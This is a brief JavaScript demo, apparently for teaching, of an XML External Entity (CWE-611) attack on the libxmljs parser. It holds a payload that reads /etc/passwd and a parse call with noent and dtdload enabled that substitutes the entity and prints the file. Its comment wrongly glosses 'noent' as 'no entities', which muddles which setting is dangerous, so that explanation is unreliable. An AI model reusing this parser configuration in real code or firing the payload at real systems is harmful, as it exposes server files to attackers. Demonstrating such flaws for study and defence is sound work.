const libxmljs = require('libxmljs'); // A popular XML parsing library

// Malicious XML payload with an XXE entity
const xxePayload = `
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <user>&xxe;</user>
</root>
`;

// --- VULNERABLE CODE ---
// Parsing XML without disabling external entities.
// The `noent` (no entities) option is false by default in some older versions or configurations.
const xmlDoc = libxmljs.parseXml(xxePayload, { noent: true, dtdload: true }); // CWE-611: Improper Restriction of XML External Entity Reference

const result = xmlDoc.get('//user').text();
console.log('XXE attack result:', result);
// -----------------------